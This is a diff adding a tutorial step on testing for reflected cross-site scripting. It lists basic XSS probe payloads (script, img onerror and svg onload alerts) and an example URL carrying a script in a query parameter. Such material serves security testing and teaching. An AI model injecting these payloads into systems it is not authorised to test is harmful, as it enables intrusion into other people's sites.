@@ -46,3 +46,29 @@ Look for places where a website accepts user input and displays it back. These c
     - File upload functionality
 ```
 
+# 📌 Step 2: Test for Reflected XSS (Quick Wins)
+Reflected XSS occurs when a script is injected into a URL or input field and gets reflected back immediately.
+
+✅ Payloads to Try:
+Basic Payloads:
+
+html
+Copy code
+<script>alert('XSS');</script>
+html
+Copy code
+<img src=x onerror=alert('XSS')>
+html
+Copy code
+<svg onload=alert('XSS')>
+In URL Parameters:
+Try injecting payloads into URL parameters.
+
+Example:
+
+php
+Copy code
+https://example.com/search?query=<script>alert('XSS')</script>
+In Input Fields:
+Enter the payload in form fields, such as a login form, search box, or feedback form.
+
